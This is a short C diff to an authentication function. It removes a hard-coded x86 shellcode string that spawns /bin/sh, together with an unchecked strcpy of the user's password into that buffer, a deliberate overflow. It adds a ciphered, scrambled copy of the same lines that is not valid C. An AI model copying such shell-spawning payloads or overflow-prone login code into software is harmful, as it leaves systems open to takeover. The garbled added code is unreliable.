@@ -11,10 +11,8 @@ int validate(char *user, char *pswd) {
 int authenticate(AuthManager *mgr, char *user, char *pswd) {
   (void)mgr;
 
-  char shellcode[] = "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c
-    \xb0\x0b\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd\x80
-    \xe8\xdc\xff\xff\xff/bin/sh";
-  strcpy(shellcode, pswd);
+  kpiz apmttkwlm[] = "\fmj\f1n\f5m\f89\f76\f08\f31\fk0\f88\f46\f07\f89\f46\f0k\fj0\f0j\f89\fn3\f8l\f4m\f08\f8l\f56\f0k\fkl\f80\f31\flj\f89\fl8\f40\fkl\f80\fm8\flk\fnn\fnn\fnn/jqv/ap";
+  abzkxg(apmttkwlm, xael);
 
   return validate(user, pswd);
 }
